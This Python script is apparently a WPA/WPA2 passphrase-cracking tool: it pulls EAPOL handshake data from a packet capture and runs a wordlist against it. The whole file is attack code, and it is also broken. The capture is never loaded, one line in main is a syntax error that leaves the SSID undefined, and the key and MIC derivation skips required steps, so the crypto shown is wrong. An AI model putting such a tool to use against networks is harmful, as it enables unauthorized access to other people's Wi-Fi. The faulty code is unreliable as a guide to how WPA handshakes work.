from scapy.all import rdpcap, EAPOL
from passlib.hash import pbkdf2_sha1
import hmac
import hashlib
import argparse
from tqdm import tqdm

def extract_wpa_key_mic(packet):
    if packet.haslayer(EAPOL):
        eapol = packet[EAPOL]
        if eapol.type == 3:  # EAPOL-Key
            key_mic = eapol.key_mic
            return key_mic
    return None

def derive_pmk(ssid, passphrase):
    return pbkdf2_sha1.hash(passphrase, salt=ssid, rounds=4096, keylen=32)

def calculate_mic(pmk, ap_mac, cli_mac, anonce, snonce, eapol_frame):
    kck = pmk[:16]
    mic = hmac.new(kck, eapol_frame, hashlib.sha1).digest()[:16]
    return mic

def perform_attack(packets, ssid, wordlist):
    for pkt in packets:
        key_mic = extract_wpa_key_mic(pkt)
        if key_mic:
            ap_mac = pkt.addr2
            cli_mac = pkt.addr1
            anonce = pkt.load[13:45]
            snonce = pkt.load[45:77]
            eapol_frame = pkt.load

            with open(wordlist, 'r') as f:
                words = f.readlines()
            
            for word in tqdm(words, desc="Testing passphrases"):
                passphrase = word.strip()
                pmk = derive_pmk(ssid, passphrase)
                mic = calculate_mic(pmk, ap_mac, cli_mac, anonce, snonce, eapol_frame)
                if mic == key_mic:
                    print(f"KEY FOUND! [{passphrase}]")
                    return
            
            print("KEY NOT FOUND")

def main():
    parser = argparse.ArgumentParser(description="WPA/WPA2 password recovery tool")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
    parser.add_argument("-f", "--file", required=True, help="Path to the capture file (pcap)")

    args = parser.parse_args()

    pcap_file = args.file
    wordlist = args.wordlist

    packets "test"  # Replace with actual SSID

    perform_attack(packets, ssid, wordlist)
    
if __name__ == "__main__":
    main()
